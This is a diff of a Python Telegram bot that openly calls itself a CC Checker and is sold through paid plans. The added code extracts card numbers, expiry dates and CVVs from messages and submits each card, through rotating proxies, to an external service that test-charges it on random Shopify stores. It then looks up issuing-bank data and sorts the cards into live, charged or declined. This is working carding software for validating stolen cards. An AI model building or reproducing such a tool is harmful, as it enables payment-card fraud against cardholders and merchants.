-        text = f"📊 Bot Stats\nUsers: {stats['total_users']}\nChecks: {stats['total_checks']}\nRedeems: {stats['total_redeems']}\nCodes: {len(db.data['redeem_codes'])}"
-        await update.message.reply_text(text)
-        return
-    stats = db.get_user_stats(user_id)
-    if not stats:
-        await update.message.reply_text("No stats yet.")
-        return
-    text = f"📊 Your Stats\nTotal checks: {stats['total_checks']}\nLive: {stats['live']}\nCharge: {stats['charge']}\nDead: {stats['dead']}\nUnknown: {stats['unknown']}"
-    await update.message.reply_text(text)
-
-async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "💎 Premium Plans:\n"
-        "1 Day – ₹250\n"
-        "1 Month – ₹500\n"
-        "1 Year – ₹1000\n"
-        "Lifetime – ₹2500\n\n"
-        "Contact @theaadikoder to buy."
-    )
-
-async def get_red_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Unauthorized.")
-        return
-    if len(context.args) != 2:
-        await update.message.reply_text("Usage: /get_red <credits> <duration> (e.g., 300 1m)")
-        return
-    try:
-        credits = int(context.args[0])
-        duration = context.args[1]
-        if not duration.endswith(('m','y','d')):
-            duration += 'd'
-        code = code_manager.generate_code()
-        db.create_redeem_code(code, credits, duration, OWNER_ID)
-        await update.message.reply_text(f"Code generated: `{code}`\nCredits: {credits}\nDuration: {duration}", parse_mode='Markdown')
+        url = f"https://bins.antipublic.cc/bins/{bin_code}"
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            return {
+                "brand": data.get("brand", "N/A"),
+                "type": data.get("type", "N/A"),
+                "level": data.get("level", "N/A"),
+                "bank": data.get("bank", "N/A"),
+                "country": data.get("country_name", "N/A"),
+                "country_emoji": data.get("country_flag", "ðŸ³ï¸")
+            }
     except:
-        await update.message.reply_text("Invalid input.")
+        pass
+    return {
+        "brand": "N/A",
+        "type": "N/A",
+        "level": "N/A",
+        "bank": "N/A",
+        "country": "N/A",
+        "country_emoji": "ðŸ³ï¸"
+    }
 
-async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Unknown command. Use /help.")
+def format_result(card, api_json, user, user_id, elapsed):
+    gateway = api_json.get("Gateway", "Shopify Normal")
+    status = api_json.get("Status", api_json.get("status", "Unknown"))
+    response_msg = api_json.get("Response", api_json.get("response", ""))
+    amount_raw = (
+        api_json.get("Amount")
+        or api_json.get("amount")
+        or api_json.get("price")
+        or api_json.get("Price")
+    )
+    try:
+        amount_value = float(str(amount_raw).replace("$", "").strip())
+        amount = f"${amount_value:.2f}"
+    except:
+        amount = "N/A"
 
-# ============== MAIN ==============
-def main():
-    logging.basicConfig(level=logging.INFO)
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("sh", single_check))
-    app.add_handler(CommandHandler("msh", multi_check))
-    app.add_handler(CommandHandler("chk", file_check))
-    app.add_handler(CommandHandler("proxy", proxy_command))
-    app.add_handler(CommandHandler("redeem", redeem_command))
-    app.add_handler(CommandHandler("plan", plan_command))
-    app.add_handler(CommandHandler("stats", stats_command))
-    app.add_handler(CommandHandler("buy", buy_command))
-    app.add_handler(CommandHandler("get_red", get_red_command))
-    app.add_handler(MessageHandler(filters.Document.ALL, file_check))
-    app.add_handler(MessageHandler(filters.COMMAND, unknown))
-    print("Bot started!")
-    app.run_polling()
+    bin_code = card.split('|')[0][:6]
+    bininfo = bin_lookup(bin_code)
 
+    status_lower = str(status).lower()
+    response_lower = str(response_msg).lower()
+    declined_phrases = [
+        "declined", "card_declined", "authorization_error", "authentication_failed",
+        "do_not_honor", "pick_up_card", "pickup_card", "stolen_card", "lost_card",
+        "incorrect_number", "expired_card", "processing_error", "fraudulent",
+        "generic_error", "fraud_suspected", "invalid_payment_error", "amount_too_small"
+    ]
+
+    if any(x in status_lower or x in response_lower for x in declined_phrases):
+        status_str = "ðƒðžðœð¥ð¢ð§ðžð âŒ"
+        response_show = response_msg
+    elif any(x in response_lower for x in [
+        "3d", "authentication", "3d secure", "OTP_REQUIRED", "3ds", "otp", "verify", "verification"
+    ]):
+        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        response_show = response_msg
+    elif "insufficient" in response_lower or "low funds" in response_lower:
+        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        response_show = response_msg
+    elif "incorrect_zip" in response_lower:
+        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        response_show = response_msg
+    elif any(x in response_lower for x in [
+        "incorrect cvc", "invalid cvc", "incorrect cvv", "incorrect_cvc",
+        "INSUFFICIENT_FUNDS", "invalid cvv", "incorrect security code",
+        "invalid security code"
+    ]):
+        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        response_show = response_msg
+    elif any(x in response_lower for x in [
+        "thank you", "order placed", "charged", "â¤¿ORDER_PAIDâ¤¾",
+        "successfully paid", "payment successful"
+    ]):
+        status_str = "ð‚ð¡ðšð«ð ðžð ðŸ’Ž"
+        response_show = response_msg
+    else:
+        approved_phrases = ["approved", "charged", "success", "live", "approved!"]
+        is_approved = any(p in status_lower for p in approved_phrases)
+        status_str = f"{esc(status)} {'âœ…' if is_approved else 'âŒ'}"
+        response_show = response_msg
+
+    link = "https://t.me/NIKSHACKS"
+    b = lambda t: f"<b>{t}</b>"
+    m = lambda t: f"<code>{t}</code>"
+    ks = f'<a href="{link}">ÏŸ</a>'
+    su = f'<a href="{link}">ã‚¹</a>'
+    curl = f'<a href="{link}">âŒ¯</a>'
+
+    text = (
+        f"{b('#Shopi | Luffy [/sh]')}\n"
+        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"{b(f'[{ks}] Card:')} {m(card)}\n"
+        f"{b(f'[{ks}] Gateway:')} {m(f'{gateway} {amount}')}\n"
+        f"{b(f'[{ks}] Status:')} {m(esc(status_str))}\n"
+        f"{b(f'[{ks}] Response:')} {m(esc(response_show))}\n"
+        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"{b(f'[{curl}] Bin:')} {m(bin_code)}\n"
+        f"{b(f'[{curl}] Info:')} {m(bininfo['brand'] + ' - ' + bininfo['type'] + ' - ' + bininfo['level'])}\n"
+        f"{b(f'[{curl}] Bank:')} {m(bininfo['bank'])}\n"
+        f"{b(f'[{curl}] Country:')} {m(bininfo['country'] + ' - ' + bininfo['country_emoji'])}\n"
+        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f'{b(f"[{su}] Checked By:")} <a href="tg://user?id={user_id}">{esc(user)}</a>\n'
+        f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=8570832903\">Luffy - â˜˜ï¸</a>\n"
+        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live ðŸŒ¥]')}"
+    )
+    return text
+
+def extract_cards_from_text(text: str) -> List[str]:
+    patterns = [
+        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
+        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
+        r'\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b',
+        r'\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b',
+        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
+        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
+        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
+        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
+        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
+        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
+        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
+        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
+        r'^(\d{4})-(\d{4})-(\d{4})-(\d{4})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
+        r'^(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
+    ]
+    cards = []
+    for pattern in patterns:
+        matches = re.findall(pattern, text)
+        for match in matches:
+            if len(match) == 4:
+                cc, mm, yy, cvv = match
+                mm = mm.zfill(2)
+                if len(yy) == 4:
+                    yy = yy[2:]
+                card_string = f"{cc}|{mm}|{yy}|{cvv}"
+                if card_string not in cards:
+                    cards.append(card_string)
+    return cards
+
+# ===================== BOT COMMAND HANDLERS =====================
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "Welcome to the CC Checker Bot! Use /sh to check a card.")
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
+def check_card(message):
+    uid = str(message.from_user.id)
+    username = (message.from_user.username or "").lower()
+
+    if user_check_in_progress.get(uid, False):
+        bot.reply_to(message, "â³ á´˜ÊŸá´‡á´€êœ±á´‡ á´¡á´€Éªá´›: Êá´á´œÊ€ ÊŸá´€êœ±á´› á´„Êœá´‡á´„á´‹ Éªêœ± êœ±á´›ÉªÊŸÊŸ á´˜Ê€á´á´„á´‡êœ±êœ±ÉªÉ´É¢.")
+        return
+
+    now = time.time()
+    last_end = last_check_time.get(uid, 0)
+    cooldown = 0
+    if now - last_end < cooldown:
+        wait_sec = int(cooldown - (now - last_end))
+        bot.reply_to(message, f"â³ á´¡ÊœÊ êœ±á´ Êœá´œÊ€Ê€Ê? á´¡á´€Éªá´› {wait_sec}sâ€¦")
+        return
+
+    user_check_in_progress[uid] = True
+
+    args = message.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(message, "âŒ á´œêœ±á´€É¢á´‡: /êœ±Êœ [á´„á´„|á´á´|ÊÊ|á´„á´ á´ ]")
+        user_check_in_progress[uid] = False
+        return
+
+    card = args[1].replace(" ", "")
+    if not is_valid_card(card):
+        bot.reply_to(message, "âŒ ÉªÉ´á´ á´€ÊŸÉªá´… á´„á´€Ê€á´… êœ°á´Ê€á´á´€á´›. á´œêœ±á´‡ á´„á´„|á´á´|ÊÊ|á´„á´ á´ ")
+        user_check_in_progress[uid] = False
+        return
+
+    status_msg = bot.reply_to(message, "Êá´á´œÊ€ Ê€á´‡Qá´œá´‡êœ±á´› Ê€á´‡á´„á´‡Éªá´ á´‡á´…!")
+    t0 = time.time()
+
+    def process_check():
+        try:
+            max_attempts = 3
+            last_error = None
+            response = None
+
+            for attempt in range(max_attempts):
+                try:
+                    proxy_raw = random.choice(proxy_list)
+                    proxy_url = f"http://{proxy_raw}"
+                    proxy_param = urllib.parse.quote(proxy_url, safe='')
+
+                    shop_url = random.choice(shop_urls)
+                    api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy_param}"
+
+                    # No outer proxy â€“ the proxy is only passed as a parameter
+                    response = requests.get(api_url, timeout=30)
+                    break
+                except Exception as e:
+                    last_error = e
+                    if attempt == max_attempts - 1:
+                        raise
+                    time.sleep(1)
+
+            try:
+                api_json = response.json()
+            except Exception:
+                api_json = {"Response": response.text}
+
+            elapsed = time.time() - t0
+            user_display = message.from_user.username or message.from_user.first_name
+            result_text = format_result(
+                card, api_json,
+                user=user_display,
+                user_id=message.from_user.id,
+                elapsed=elapsed
+            )
+
+            bot.edit_message_text(
+                result_text,
+                chat_id=status_msg.chat.id,
+                message_id=status_msg.message_id,
+                parse_mode='HTML'
+            )
+
+        except Exception as e:
+            bot.edit_message_text(
+                f"âŒ Error: {str(e)}",
+                chat_id=status_msg.chat.id,
+                message_id=status_msg.message_id
+            )
+        finally:
+            user_check_in_progress[uid] = False
+            last_check_time[uid] = time.time()
+
+    threading.Thread(target=process_check, daemon=True).start()
+
+# ===================== BOT POLLING =====================
 if __name__ == "__main__":
-    main()
+    print("Bot started...")
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=60)
+        except Exception as e:
+            print(f"Polling error: {e}")
+            time.sleep(5)
